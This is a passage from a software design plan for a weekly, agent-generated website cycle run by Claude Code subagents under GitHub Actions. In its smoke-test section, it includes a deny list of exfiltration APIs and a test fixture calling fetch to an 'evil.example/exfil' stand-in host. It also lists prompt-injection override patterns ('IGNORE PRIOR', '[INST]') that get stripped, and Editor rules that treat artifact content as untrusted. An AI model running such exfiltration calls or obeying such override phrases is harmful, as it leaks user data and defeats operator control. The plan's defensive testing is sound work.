- Vercel API Routes' default export pattern (matches Next.js conventions).
- Vercel project linking via `vercel link` (one-time CLI step) or via the dashboard's GitHub integration.

**Test scenarios:**
- *Happy path:* `vercel.json` validates against Vercel's schema (`vercel build` succeeds locally).
- *Happy path:* `api/submit-application.js` accepts a valid POST body, forwards to `ATTIO_WEBHOOK_URL`, returns 200. Mock the webhook fetch in the test.
- *Happy path:* CSP header is present on a request to `/archive/_test/` and absent (or different) on a request to `/cli/`.
- *Integration:* The CLI terminal's `apply` command posts to `/api/submit-application` and receives a successful response in the Vercel preview deploy.
- *Edge case:* `api/submit-application.js` rejects non-POST methods with 405.

**Verification:**
- `vercel.json` lints cleanly.
- The Vercel preview deploy serves the existing CLI terminal identically to Netlify.
- The application submission flow works end-to-end on Vercel preview.
- After DNS cut: root.vc serves from Vercel; analytics/uptime checks confirm no regression.
- Netlify site decommissioned; `netlify.toml` and `netlify/` directory removed.

---

### Phase 1: Foundation

- [ ] U1. **Expand config layer**

**Goal:** Add the new plain-text editable configs the Author and Editor will consume each cycle. Facts (firm metadata) match the existing JS object literal pattern; prose-heavy guidance (brand brief, no-fly list, topical rubric) is Markdown. Asset library and cycle-config tunables are inlined for v1 (see Scope Boundaries).

**Requirements:** R1, R2, R23 (rubric)

**Dependencies:** U0 (runtime validated)

**Files:**
- Create: `config/firm.js` (firm metadata: name, mission, thesis, fund size, check size, address, founded, social handles, contact paths)
- Create: `config/brand-brief.md` (voice DOs, tone, examples of "on-brand" vs "off-brand")
- Create: `config/no-fly-list.md` (taboo topics, hard-no aesthetics, sensitive-handling rules)
- Create: `config/topical-rubric.md` (4-tier rubric: hard-block / soft-block / approve-with-care / lean-in with examples per tier)
- Create: `config/weekly-hook.txt` (single-line text the team can drop a one-liner into; empty by default)
- Create: `images/README.md` (catalog of reusable assets — replaces the deferred `asset-library.js`; documents intended use per directory and per portfolio company)
- Create: `.github/CODEOWNERS` (gates `config/brand-brief.md`, `config/no-fly-list.md`, `config/topical-rubric.md` per DC17)
- Modify: `scripts/build-assets.js` — only `config/firm.js` joins `appBundleSources` (so the existing CLI page can reference it if needed)
- Test: `tests/config/expanded-config.test.js`

**Approach:**
- Mirror the format of [config/portfolio.js](config/portfolio.js) and [config/team.js](config/team.js) for JS configs (top-level `const`, comments encouraged).
- Markdown configs are human-edited; load them as raw strings from the cycle (no parsing required).
- `cycle-config.js` is the single source of truth for tunables — no magic numbers in scripts.

**Patterns to follow:**
- Existing config files in [config/](config/) — naming, structure, inline comments.
- The existing pattern of bundling configs in `scripts/build-assets.js:appBundleSources`.

**Test scenarios:**
- *Happy path:* Each JS config exports the expected top-level constant and structure; e.g., `firm.name`, `firm.mission` exist and are non-empty strings.
- *Happy path:* Each Markdown config file exists, is non-empty, and has the documented sections (e.g., `brand-brief.md` has at least a "Voice" and "Examples" section header).
- *Edge case:* `weekly-hook.txt` empty file is valid; cycle treats absence-of-content as "no hook this week."
- *Edge case:* `cycle-config.js` exports numeric tunables with sane defaults; if `N` < 1, fail loudly at import time.

**Verification:**
- All seven new files exist with the expected shapes.
- `npm test` passes.
- `npm run build` still succeeds with `firm.js` added to the bundle.

---

- [ ] U2. **Archive directory + minimal bootstrap (CLI preservation)**

**Goal:** Establish the `/archive/` directory structure. Preserve the current CLI terminal at a stable `/cli/` URL with all its assets vendored locally so it survives first cycle's replacement of root `index.html`. Leave `welcome.htm` and `game.html` at their existing paths — no `/archive/_legacy/` mirroring in v1 (deferred per Scope Boundaries).

**Requirements:** R10 (archive permalinks), DC1 (minimal bootstrap migration), R11 (history view — gracefully empty on cycle 1)

**Dependencies:** U1

**Files:**
- Create: `archive/.gitkeep` (so the empty directory is committed)
- Create: `cli/index.html` (snapshot of the current root `index.html` with all paths rewritten to absolute or vendored — see Approach for asset policy)
- Create: `cli/` containing vendored copies of `js/app.bundle.js`, `js/xterm.js`, `css/xterm.css`, `css/styles.css`, and any referenced images, so `/cli/` is fully self-contained
- Test: `tests/cycle/cli-preservation.test.js`

**Approach:**
- **Asset vendoring policy: full vendor.** Copy every asset `cli/index.html` references into the `/cli/` directory. Rewrite paths to be relative (`./app.bundle.js` etc.). This makes `/cli/` a true static snapshot that survives any future drift in root assets.
- Original URLs (`/welcome.htm`, `/game.html`) stay at their current paths untouched — they remain the canonical pages for those experiences.
- Cycle 1's history view will render with an empty back-catalog of generated drops — the in-world entrance gracefully shows "no past drops yet" or similar.
- Full `/archive/_legacy/` migration is deferred — once the team has 2-3 generated drops in the catalog, evaluate whether mirroring `welcome.htm` and `game.html` is still worth the effort.

**Test scenarios:**
- *Happy path:* `cli/index.html` loads in JSDOM without errors (regression check that the snapshot is intact).
- *Happy path:* All `<script>` and `<link>` references in `cli/index.html` resolve to paths within `cli/`.
- *Integration:* `/welcome.htm` and `/game.html` URLs are unchanged from baseline (no accidental moves).

**Verification:**
- `/cli/` directory is fully self-contained and loads the CLI terminal experience identically to the pre-cycle root.
- The original `/welcome.htm` and `/game.html` URLs still serve their original content.

---

### Phase 2: Generation core

- [ ] U3. **Smoke test framework + assertions**

**Goal:** Extend the existing test harness to assert against a fresh archive directory; implement the five smoke test files (anchor facts, history entrance, archive size, structural, source scan). These tests are reused by (a) the cycle itself (Editor's safety net) and (b) regular CI (post-merge regression check). When invoked without `ARTIFACT_PATH`, smoke tests no-op gracefully so the existing `npm test` PR gate doesn't flake.

**Requirements:** R3, R12, R18, DC4, DC6 (90% threshold), DC7, DC11 (source scan), DC13 (JSDOM-compat allowlist)

**Dependencies:** U1 (configs to read against), U2 (CLI snapshot as test fixture)

**Files:**
- Create: `tests/helpers/artifact-env.js` (extends `browser-env.js`: loads an archive directory's `index.html` + referenced CSS/JS into JSDOM, returns the rendered window; polyfills `IntersectionObserver`/`ResizeObserver` as no-ops so JSDOM doesn't throw on enhancement code)
- Create: `tests/cycle/anchor-facts.test.js` (parameterized over an `ARTIFACT_PATH` env var so the cycle can run it against `archive/YYYY-MM-DD/`)
- Create: `tests/cycle/history-entrance.test.js`
- Create: `tests/cycle/archive-size.test.js`
- Create: `tests/cycle/structural.test.js`
- Create: `tests/cycle/source-scan.test.js` (DC11 deny-list regex on generated JS)
- Create: `scripts/cycle/source-scan.js` (the deny-list implementation, exported so both the smoke test and the orchestrator can call it)
- Modify: `package.json` — add `npm run smoke -- --artifact=archive/YYYY-MM-DD` script
- Modify: `netlify.toml` — add `[[headers]]` block setting CSP on `/archive/*` paths blocking external origins and inline scripts without a nonce

**Approach:**
- The smoke tests are *Vitest tests* — they run via `npx vitest run tests/cycle/`. Parameterization is via `process.env.ARTIFACT_PATH`. **When `ARTIFACT_PATH` is unset (regular CI runs), every cycle test calls `it.skip(...)` at the top — no false fails, no false greens.**
- `artifact-env.js` reads the archive directory's `index.html` from disk, parses asset references, and assembles a JSDOM window with the no-op polyfills.
- Anchor-fact tests read [config/portfolio.js](config/portfolio.js) + [config/team.js](config/team.js) + `config/firm.js` and assert **at least 90% of entities** appear somewhere in the rendered DOM (textContent or attribute values like `href`, `alt`, `title`). Missing entities cap at 10%; the Editor must justify each omission in `meta.editorial_note` for the cycle to ship. Firm name + mission + contact link are 100%-required even at 90% coverage.
- History-entrance test queries `a[href*="/archive/"]`, validates visibility per DC7's three-check rule (`display`/`visibility`/`opacity`), and checks for non-empty text or aria-label.
- Archive-size test uses `fs.statSync` walking the archive directory; rejects on total > 5MB or per-file base64 inline > 50KB.
- Structural test checks for `<title>` non-empty, broken relative `href`/`src` paths. Console.error checks use an allowlist of JSDOM-known false positives (CSS-parse warnings, unsupported APIs) — only NEW console errors fail the test.
- Source scan invokes `scripts/cycle/source-scan.js` to grep every `.js` file in the archive directory for deny-list patterns: `fetch(`, `XMLHttpRequest`, `new WebSocket`, `navigator.sendBeacon`, `document.createElement('script')` followed by `appendChild`, `meta[http-equiv*="Content-Security-Policy"]` overrides. Matches fail the test.
- **Skip mechanism for `meta.legacy === true`:** each smoke test reads the artifact's `meta.json` before asserting; if `meta.legacy` is true, the test calls `it.skip("legacy entry exempted")`. The skip is logged for visibility.

**Execution note:** Write the smoke tests *first*, parameterized against the CLI preservation snapshot at `/cli/` (which should pass structural and history-entrance trivially, and pass anchor-facts since the CLI's `whois` command outputs the portfolio). Then U4's Author/Editor prompts are written knowing exactly what the gate looks like.

**Patterns to follow:**
- [tests/helpers/browser-env.js](tests/helpers/browser-env.js) — JSDOM construction, script loading, global export pattern.
- [tests/game.test.js](tests/game.test.js) — the markup-fixture-driven test pattern.

**Test scenarios (for the test framework itself):**
- *Happy path:* `artifact-env.js` loads `/cli/` without errors and exposes the rendered DOM.
- *Happy path:* `anchor-facts.test.js` against `/cli/` passes (the CLI surfaces portfolio + team via commands; meta.legacy may be set, in which case test is skipped — verify the skip mechanism works).
- *Happy path:* `source-scan.test.js` against `/cli/` passes (the CLI's xterm bundle uses `fetch` but `cli/index.html`'s own JS doesn't — the test scans only the artifact's own emitted JS, not vendored libraries, identified by file naming convention or directory).
- *Edge case:* `ARTIFACT_PATH` unset → all cycle tests `.skip` cleanly; CI still green.
- *Edge case:* Artifact whose meta has `legacy: true` → all cycle tests skip with logged reason.
- *Failure path:* When an artifact omits 7 out of 60 portfolio companies (11% missing), `anchor-facts.test.js` fails listing the specific names and the editorial_note's omission rationale (if any) for context.
- *Failure path:* When an artifact omits firm name or mission, `anchor-facts.test.js` fails regardless of overall coverage percentage (100% required for the core triad).
- *Failure path:* `history-entrance.test.js` rejects an artifact whose only archive link has `style="display:none"`.
- *Failure path:* `archive-size.test.js` rejects a fixture with a 60KB base64 inline image.
- *Failure path:* `source-scan.test.js` rejects an artifact's `script.js` containing `fetch("https://evil.example/exfil")`.
- *Failure path:* `source-scan.test.js` rejects an artifact containing a `<meta http-equiv="Content-Security-Policy">` override.

**Verification:**
- All five smoke tests exist and run against fixture data deterministically.
- `npm run smoke -- --artifact=cli/` passes.
- Test suite runs in < 5 seconds against a single archive entry.
- `npm test` (no `ARTIFACT_PATH`) still passes — cycle tests skip cleanly.

---

- [ ] U4. **Cycle orchestrator + Author/Editor prompts**

**Goal:** Build the orchestration script and prompt templates that drive the Author + Editor + revision loop. The script is invoked by the GitHub Actions cron workflow (U6) and runs inside `claude-code-action@v1` (SHA-pinned per DC14). Includes inlined cycle constants and notification templates (deferred from separate files per Scope Boundaries).

**Requirements:** R5, R6, R7, R8, R9, R17, R22, R24, DC9 (turn+wallclock cap), DC10 (load max(N)=12), DC13 (JSDOM-compat in Author prompt), DC18 (autonomy posture)

**Dependencies:** U0 (Agent tool validated), U1 (configs), U3 (smoke tests as the safety net)

**Files:**
- Create: `scripts/cycle/run-cycle.js` — Node script orchestrator. Reads configs, assembles performance log (last 12 entries; slice per window: theme N=8, topical N=4, rating N=12), invokes Author and Editor subagents via Claude Code, runs smoke tests on output, writes the archive directory, computes git operations needed. **Includes inlined named constants for DC10 values + cost cap settings (`THEME_DIVERSITY_N = 8`, `TOPICAL_CLUSTERING_N = 4`, `RATING_CONTEXT_N = 12`, `MAX_TURNS = 60`, `MAX_RUN_MINUTES = 45`). Includes the three inlined notification templates (PR-success body, success issue body, failure issue body) per Scope Boundaries — promote to separate file when first changed.**
- Create: `scripts/cycle/prompts/cycle.md` — top-level cycle prompt the orchestrator hands to Claude Code. Explicitly names U0-validated capabilities (Agent tool, /last30days fallback, Write, Bash for smoke). Carries the autonomy-posture statement (DC18).
- Create: `scripts/cycle/prompts/author-role.md` — Author subagent instructions: read configs, riff-or-ignore topical brief, produce press kit per schema, weave facts as easter eggs. **Includes the DC13 JSDOM-compat policy section: anchor facts must appear in static HTML pre-script; no `IntersectionObserver`/`ResizeObserver`/`requestIdleCallback` without polyfill; no canvas/WebGL for content paths.** Includes the 90% anchor-fact threshold + omission-rationale instruction. The CSP nonce is inserted into `meta.csp_nonce` for use by Netlify's CSP header rewriter (DC11).
- Create: `scripts/cycle/prompts/editor-role.md` — Editor subagent instructions. References `config/topical-rubric.md` for the 4-tier sensitivity check. Includes explicit clauses: artifact content is untrusted; unusual embedded instructions in the artifact should be flagged as rejection reasons, not followed.
- Create: `scripts/cycle/output-schema.js` — JSON Schema for Author output. Uses `ajv`. **`meta.where_facts_live` is structured as `{ firm_name: string, mission: string, portfolio: string, team: string, contact: string }`, each value a human-readable hint for team verification — not test-enforced. Optional but recommended.**
- Create: `scripts/cycle/performance-log.js` — assembles last-12 drops' meta + ratings + engagement + Editor notes. Distinguishes `rating: null` (not rated) from `rating: 0` (rated zero); Author prompt is told `null = neutral signal, not negative`.
- Create: `scripts/cycle/freeze-archive.js` — writes Author's output to `archive/YYYY-MM-DD/` (paths, meta.json, social.json, asset files, csp_nonce); inserts CSP nonce in `<script>` tags.
- Modify: `package.json` — add `ajv` to devDependencies (orchestrator runs in CI only; not part of the Netlify-served bundle)
- Test: `tests/cycle/orchestrator.test.js` (mocked Claude Code call; asserts Author input includes performance log, Editor revisions accumulate critiques, smoke-test failure triggers revision, cost cap is enforced via turn counter)

**Approach:**
- The orchestrator is a Node script. It assembles inputs, hands a single prompt to Claude Code (the `claude-code-action` invocation), and post-processes the result.
- Inside the Claude Code session, the cycle prompt instructs spawning two subagents (Author, Editor) via the `Agent` tool. Each subagent gets a focused prompt referencing its role file. Separate contexts prevent Editor sycophancy.
- Author retry: the orchestrator's loop logic re-invokes the Author subagent with the prior attempt + Editor critique + smoke-test failures as additional input. Retry counter is part of the prompt so Author knows "this is attempt 2; address the specific critique."
- Output schema validation is enforced by `output-schema.js`. Author output failing schema validation counts as a soft-reject — Author retries with a critique that says "your output didn't match the schema; here's what failed."
- **Cost cap is enforced by Claude Code's `--max-turns` flag (set in the workflow's `claude_args`) and the GH Actions job-level `timeout-minutes:` cap (DC9). The orchestrator does not attempt to track per-API-response token usage — that's unobservable from inside `claude-code-action`. Post-cycle, the action's `execution_file` output is parsed for an approximate token total and surfaced in the success/failure notification.** The Anthropic console's per-key spending limit is the hard backstop (DC15).
- The cycle's "topical context" is fetched in U5 and passed in via the orchestrator (so this unit doesn't need to know about `/last30days` directly).

**Execution note:** Test-first for `orchestrator.test.js` — mock the Claude Code invocation, assert the structural behaviors (loop, retry counters, smoke-test triggering revision). Real-claude integration testing happens by running the workflow end-to-end manually on a side branch before the cron is enabled (see U6).

**Technical design:** *(optional — see High-Level Technical Design above for the cycle pseudo-flow and Author output schema.)*

**Patterns to follow:**
- Existing Node-script style in [scripts/build-assets.js](scripts/build-assets.js) (CommonJS, no frameworks, direct fs use).
- The general structure of how `claude-code-action@beta` is invoked in [.github/workflows/claude.yml](.github/workflows/claude.yml).

**Test scenarios:**
- *Happy path:* Given mock Author output that passes schema + smoke tests, the orchestrator writes archive files and returns success.
- *Happy path:* Performance log includes last 8 archives' meta + ratings; topical clustering window is 4; rating context window is 12.
- *Edge case:* When the topical fetcher (U5) returns no brief, Author input has `topical: null` and the prompt explicitly says "no topical seed this week."
- *Edge case:* On first cycle (no archives in `archive/` other than `_legacy/`), performance log is seeded from `_legacy/` entries with hand-written theme keys.
- *Error path:* Author output failing schema → soft reject → retry with critique; after 3 failures the orchestrator aborts.
- *Error path:* Editor returns `{ decision: "reject", critique: "..." }` → Author retry with critique appended.
- *Error path:* Smoke test failure → Author retry with the test failure messages as critique.
- *Error path:* Token spend exceeds ceiling → orchestrator aborts mid-loop, no archive written, no branch created.
- *Integration:* The orchestrator's exit code is the contract with the GH Action — 0 = success (PR opens), non-zero = failure (no PR, failure issue opens).

**Verification:**
- `tests/cycle/orchestrator.test.js` covers all scenarios above against mocked Claude Code calls.
- A manual dry-run on a side branch with `--dry-run` flag generates an archive entry, passes smoke tests, and stages a commit without pushing.

---

- [ ] U5. **Topical context fetcher integration**

**Goal:** Implement the pre-Author step that fetches a 3–5 bullet topical brief via the `/last30days` skill (or fallback) and passes it to the orchestrator. Fail-soft on any fetch error.

**Requirements:** R21, R22, R23, R24

**Dependencies:** U4 (orchestrator wires in the brief as Author input)

**Files:**
- Create: `scripts/cycle/topical-fetcher.js` — Node script the orchestrator calls; primary path invokes the `/last30days` skill via Claude Code subagent; fallback path uses direct WebSearch + WebFetch tool calls if the skill isn't available in the runtime.
- Create: `scripts/cycle/prompts/topical-fetcher.md` — prompt for the topical fetcher subagent (instructions, query taxonomy, 3–5 bullet output format, sensitivity pre-filter)
- Test: `tests/cycle/topical-fetcher.test.js`

**Approach:**
- The fetcher runs as its own Claude Code subagent (separate context). Prompt instructs: search HN front page (last 7d), X/Twitter trending in tech (last 3d), Reddit r/programming + r/ycombinator (last 3d), and major tech news (last 3d). Output: 3–5 bullets, each one a brief description **in the fetcher's own words** + a sensitivity tier hint (using `topical-rubric.md`).
- **Prompt injection hardening (per security review):** the fetcher's prompt explicitly forbids reproducing any quoted text, code blocks, or instruction-formatted content from the source material. The orchestrator post-processes the fetcher's output to strip any lines matching common injection patterns (`SYSTEM:`, `ASSISTANT:`, `IGNORE PRIOR`, `<instruction>`/`</instruction>`, `[INST]`/`[/INST]`). Stripped lines are logged for audit.
- Primary: invoke `/last30days` if available (validated in U0). The prompt asks for a tight time window (last 3–7 days, not 30); the skill's intelligent-planning layer should respect the constraint.
- Fallback: if `/last30days` is not invocable inside this runtime, the fetcher uses direct WebSearch + WebFetch tool calls following the same query taxonomy. The query list is defined in `topical-fetcher.md` so the team can edit it without code changes.
- Fail-soft: any error (skill unavailable, search timeout, no results) returns `{ topical: false, brief: null }`. The orchestrator passes that through to Author with explicit "no seed this week" guidance. **A distinct log line distinguishes "search returned no results" from "search errored and fell back" so the team can diagnose chronic fetcher failures.**
- Sensitivity pre-filter: the fetcher's prompt instructs that if any bullet sits in the "hard-block" tier (deaths, tragedies, indictments, portfolio-negative), it's excluded from the brief — the Editor never has to litigate it. The Editor's prompt also re-checks the brief independently (defense in depth).

**Patterns to follow:**
- The general subagent-spawning pattern set up in U4.
- The fallback web-search-tool pattern (basic Claude Code `WebSearch` + `WebFetch` usage).

**Test scenarios:**
- *Happy path:* Mocked `/last30days` returns 5 bullets; fetcher returns a brief with 5 entries and `topical: true`.
- *Happy path:* Mocked WebSearch fallback returns search results that the prompt synthesizes into 3–5 bullets.
- *Edge case:* All search results are hard-block sensitivity → fetcher returns empty brief with `topical: false` and a reason note for logging.
- *Error path:* `/last30days` invocation throws → fetcher attempts fallback path.
- *Error path:* Both primary and fallback fail → fetcher returns `{ topical: false, brief: null }`, never throws.
- *Integration:* The brief format matches what `author-role.md` expects (validated by a shared JSON shape in `output-schema.js`).

**Verification:**
- `tests/cycle/topical-fetcher.test.js` covers all happy/edge/error paths against mocks.
- The fetcher never causes the orchestrator to abort — failure is always non-fatal.

---

### Phase 3: Scheduling, deployment, and feedback

- [ ] U6. **GitHub Actions cron workflow + PR-based merge**

**Goal:** Wire the orchestrator into a Sunday-evening cron via `claude-code-action@v1` (SHA-pinned per DC14), with concurrency lock, dated-branch operation, least-privilege permissions block, and explicit auto-merge step. On any failure, no PR is opened and a failure issue is filed instead.

**Requirements:** R5, R19, DC2, DC3, DC9, DC14 (version + SHA pinning), DC15 (job-level permissions), DC18 (autonomy posture)

**Dependencies:** U0 (`schedule:` trigger validated), U4 (orchestrator), U5 (topical fetcher), U3 (smoke tests)

**Files:**
- Create: `.github/workflows/weekly-cycle.yml` — cron-scheduled workflow (two-step structure: claude-code-action step + auto-merge step)
- Modify: `.github/workflows/claude.yml` — migrate from `@beta` to the same `@v1` SHA-pinned reference (DC14)

**Approach:**
- `on: schedule: - cron: "0 1 * * 1"` (cron interprets as Monday 01:00 UTC; equivalent to Sunday 18:00 PT during standard time and Sunday 17:00 PT during DST — adjust the cron hour if year-round consistency matters; current minimal-disruption choice is to accept the DST offset). Manual `workflow_dispatch:` also enabled for testing.
- `concurrency: { group: weekly-cycle, cancel-in-progress: false }` so overlapping triggers queue.
- **Job-level `permissions:` block (DC15):**
  ```
  permissions:
    contents: write
    pull-requests: write
    issues: write
  ```
- **Action pinning (DC14):**
  ```
  uses: anthropics/claude-code-action@<full-40-char-SHA>  # v1.X.Y
  ```
  The same pin is applied to `claude.yml`. Dependabot's `github-actions` ecosystem alerts when the upstream tag moves.
- Steps:
  1. Checkout `main` at HEAD, capture SHA into `STARTING_SHA` env var
  2. Create branch `cycle/${{ env.CYCLE_DATE }}` based on captured SHA
  3. **Step A (claude-code-action):** invoke `anthropics/claude-code-action@<sha>` with `--max-turns 60` in `claude_args` and `--allowedTools` whitelisting `Agent`, `WebSearch`, `WebFetch`, `Write`, `Read`, `Glob`, `Grep`, `Bash(npm run smoke:*)`. The orchestrator runs inside this step: read configs, fetch topical brief, run Author/Editor loop, write archive, run smoke tests, stage files locally
  4. **Step B (auto-merge wiring):** outside the action, commit the staged files, push the branch, `gh pr create` with body filled from `meta.json` + `social.json`, `gh pr merge --auto --squash`
  5. CI on the PR runs the existing `test.yml` (`npm test` + `npm run build`) plus the smoke tests (parameterized via `ARTIFACT_PATH=archive/YYYY-MM-DD`)
  6. Auto-merge triggers only if (a) all required checks green per branch protection, (b) GitHub's auto-merge SHA check still matches main HEAD
  7. On merge, Vercel auto-deploys
  8. On non-zero exit from Step A: delete the branch (if pushed), open a "Cycle failed: YYYY-MM-DD" issue with the orchestrator's stderr summary
  9. On `main`-moved after the auto-merge was queued: GitHub blocks the merge; the cycle workflow detects this via the PR API and converts to a "raced with human commit" notification, leaving the PR open for manual handling
- **Pre-flight setup (one-time, documented in U6 verification):**
  - Repo Settings → General → Allow auto-merge: ENABLED
  - Branch protection rule on `main` requiring `test.yml` checks before merge
  - Anthropic console: per-key spending limit set on `ANTHROPIC_API_KEY` (DC15 backstop)
  - GitHub Secrets: `ANTHROPIC_API_KEY` (already exists); the default `GITHUB_TOKEN` carries the scoped `permissions:` declared in the workflow
- **No PAT** is needed — the scoped default `GITHUB_TOKEN` is sufficient given the `permissions:` block.

**Patterns to follow:**
- [.github/workflows/claude.yml](.github/workflows/claude.yml) — `claude-code-action@beta` invocation, `ANTHROPIC_API_KEY` reference.
- [.github/workflows/test.yml](.github/workflows/test.yml) — Node 20 setup, `npm ci`, `npm test`.

**Test scenarios:**
- *Happy path:* Manual `workflow_dispatch` trigger on a side branch generates an archive, passes smoke tests, stages files, exits 0, opens a PR. (Manual verification — cron-driven integration tests are impractical in unit tests.)
- *Edge case:* Workflow fires twice in quick succession (manual + cron); the second is queued behind the first by the concurrency group.
- *Error path:* Orchestrator exits non-zero; no PR opens; failure issue is created.
- *Error path:* `main` moved during the cycle; auto-merge is blocked; the cycle aborts and notifies.
- *Verification:* The workflow file passes `actionlint` (or equivalent YAML lint) cleanly.

**Verification:**
- Manual `workflow_dispatch` run on a side branch completes end-to-end without errors.
- Cron fires correctly when next scheduled (verified by GitHub Actions UI after enabling).
- A second manual run while the first is mid-flight is queued and runs sequentially.

---

- [ ] U7. **Rating + engagement signal capture (direct-edit only in v1)**

**Goal:** Define the schemas for rating + engagement signals and ensure the performance log handles absent ratings correctly. v1 uses direct file edits (PR or push) only; the comment-driven `/rate` bot is deferred per Scope Boundaries.

**Requirements:** R15, R16, R17, I7 (absent rating ≠ negative)

**Dependencies:** U4 (archive structure exists), U6 ("Drop shipped" issue creation)

**Files:**
- Create: `scripts/cycle/rating-schema.js` — JSON schema for rating.json (`[{ rater: string, rating: 1-5, note?: string, ts: ISO8601 }]`)
- Create: `scripts/cycle/engagement-schema.js` — JSON schema for engagement.json (`{ twitter: number, hn: { score?, comments? }, linkedin?: ..., manual_notes?: string }`)
- Modify: `scripts/cycle/performance-log.js` (U4) to handle absent rating.json as "not rated" (treated as neutral signal in the Author prompt, NOT as 0 stars)

**Approach:**
- v1 rating workflow: team edits `archive/YYYY-MM-DD/rating.json` directly via PR. The "Drop shipped" issue template (U8) includes the file path and a copy-pasteable example entry.
- Schema validation runs in CI on any PR touching `archive/*/rating.json` so malformed edits don't reach `main`.
- Engagement: v1 has no auto-tracker. Team edits `archive/YYYY-MM-DD/engagement.json` directly when manually logging Twitter/HN/LinkedIn numbers. **Self-improvement loop is therefore rating-only in v1 — engagement signal is empty unless the team manually populates it. This is a known reduction from origin R17 (acknowledged in Scope Boundaries).**
- Performance log: ratings absent → log entry shows `rating: null` (NOT `0`); Author prompt explicitly says "null means not yet rated, treat as neutral; the team may rate retroactively."

**Patterns to follow:**
- Existing GH Actions workflow style in [.github/workflows/](.github/workflows/).
- The single existing Netlify function pattern in [netlify/functions/submit-application.js](netlify/functions/submit-application.js) — not directly used here but illustrates the team's preference for simple, dependency-light handlers.

**Test scenarios:**
- *Happy path:* A valid rating entry in `rating.json` validates against the schema.
- *Edge case:* Out-of-range rating (e.g. `7`) fails schema validation in CI.
- *Edge case:* Multiple ratings from the same user are valid (appended; no dedup).
- *Integration:* `performance-log.js` correctly handles a drop with no rating.json (treats as null/neutral) and a drop with several ratings (passes the array through to the prompt).

**Verification:**
- Schema validation runs in CI on PRs touching `archive/*/rating.json` and `archive/*/engagement.json`.
- Performance log correctly handles both presence and absence of rating data.

---

- [ ] U8. **Notification surface: success PR description + post-merge issue + failure issue**

**Goal:** Make the team aware of cycle outcomes without requiring them to watch the repo. The auto-merge PR description carries the press-kit summary; a post-merge issue carries the same plus rating CTA; a failure issue carries the failure reason and triage links.

**Requirements:** R13, R14, R19, I8 (press kit consumption surface)

**Dependencies:** U4 (press-kit JSON exists), U6 (PR + issue creation are inside the cron workflow)

**Files:**
- Modify: `.github/workflows/weekly-cycle.yml` — extend the PR description template + issue templates
- Modify: `scripts/cycle/run-cycle.js` (from U4) to expose three inlined template-literal constants: `PR_BODY_TEMPLATE`, `SUCCESS_ISSUE_TEMPLATE`, `FAILURE_ISSUE_TEMPLATE`. Promote to a separate `notify-templates.js` file only when first changed or when a second consumer appears (per Scope Boundaries).

**Approach:**
- PR description (success): theme name, editorial note, where-facts-live summary (so reviewers can verify quickly), tweet draft (verbatim, copy-pasteable), screenshot brief, link to the live preview (Netlify deploy preview for this PR).
- Post-merge issue ("Drop shipped: YYYY-MM-DD"): same press-kit summary + `/rate N "note"` instructions + link to the live drop + link to the next-cycle-rating-deadline reminder.
- Failure issue ("Cycle failed: YYYY-MM-DD"): failure reason (Editor reject reasons, smoke-test failures, cost overrun, schema validation failures, etc.) + link to the workflow run + suggested next steps (rerun manually, edit configs, etc.). **Also includes the manual rollback command (`git revert <merge-sha> && git push`) and a one-line note: "v1 has no dedicated rollback workflow — use git revert if a bad drop slipped through and the cycle didn't catch it. This is rare; consider promoting to a workflow if it happens repeatedly."**
- No Slack/email in v1. The team subscribes to repo issues to get pings.

**Patterns to follow:**
- Existing PR description style in recent commits (`git log -p` on a few recent merges to match tone if any pattern exists; otherwise simple Markdown).

**Test scenarios:**
- *Happy path:* Given a sample press-kit JSON, `notify-templates.js` produces a PR body containing the theme name, tweet draft (verbatim), and screenshot brief.
- *Happy path:* Failure-issue template includes the workflow run URL, the failure reason category, and the failing step's last 20 log lines.
- *Edge case:* Tweet draft contains characters that would break Markdown (backticks, asterisks) — template escapes them safely.
- *Edge case:* Failure reason is missing (e.g., orchestrator crashed without producing one) → template falls back to "Cycle failed with no captured reason. See workflow run logs."

**Verification:**
- Templates produce valid Markdown that GitHub renders correctly.
- Workflow successfully posts the PR description and issue bodies (verified manually on a side-branch dry run).

---

<!-- U9 (dedicated rollback workflow) was deferred to follow-up work per Scope Boundaries.
     v1 rollback uses `git revert <merge-sha> && git push` from a team member's local clone.
     The "Cycle failed" issue template (U8) includes this command for reference.
     Promote to a dedicated workflow once the team has confirmed real-world rollback friction. -->

---

## System-Wide Impact

- **Interaction graph:** GitHub Actions cron → `claude-code-action@beta` → orchestrator → topical fetcher + Author + Editor subagents → smoke tests → git commit/push → GitHub PR auto-merge → Netlify deploy. Rating/engagement workflows + rollback workflow are sibling triggers off the same GitHub repo. The existing `claude.yml` `@claude`-mention workflow is unaffected.
- **Error propagation:** Every step in the cycle either succeeds (loop forward) or escalates a typed failure (Editor reject, smoke fail, schema fail, cost overrun, git push fail, main-moved). Typed failures route to either revision (Editor/smoke/schema) or termination (cost/git). Termination always produces a "Cycle failed" issue with the captured reason and a workflow-run link. The live site is never affected by a failed cycle — last-known-good main HEAD remains the served version.
- **State lifecycle risks:** Two main risk surfaces: (a) the in-progress cycle branch (`cycle/YYYY-MM-DD`) — owned by the workflow, cleaned up on failure; (b) the rating.json files — appended to over time, never re-written; idempotency comes from the comment-event handler validating before append. Diversity memory is a *read* of the archive directory, not a separately maintained file — no drift risk.
- **API surface parity:** The existing CLI terminal at the legacy archive URL must keep working — it's the same code, just relocated. The existing `/welcome.htm` and `/game.html` URLs must also keep working (preserved via filesystem placement, see U2). No other public surfaces change.
- **Integration coverage:** End-to-end cycle integration is tested via a manual `workflow_dispatch` on a side branch before the cron is enabled — see U6's verification. Unit tests cover the orchestrator, smoke tests, topical fetcher, rating workflow, and rollback in isolation.
- **Unchanged invariants:** The existing CLI terminal experience is preserved at a stable URL. The existing build pipeline (`scripts/build-assets.js`) is touched only minimally (adds `firm.js` to the bundle). The existing test workflow (`test.yml`) runs the same `npm test && npm run build` against every PR — the cycle's PRs go through this gate.

---

## Risks & Dependencies

| Risk | Mitigation |
|------|------------|
| `claude-code-action` capabilities (Agent tool, /last30days, Write, Bash, schedule trigger) are unverified | **U0 spike validates each capability before U1 ships.** If any P0 capability fails, architecture is revisited. |
| Editor sycophancy: same-model paired review may not catch what Author missed | Separate subagent contexts (DC18) reduce conversational priors but do not eliminate distributional similarity. **Pre-cron calibration: team manually grades the first 3 dry-run Author outputs alongside Editor's decisions; if agreement is poor, switch Editor to a different model tier (Sonnet vs Opus) before enabling the cron.** Documented as a Phase 4 expectation. |
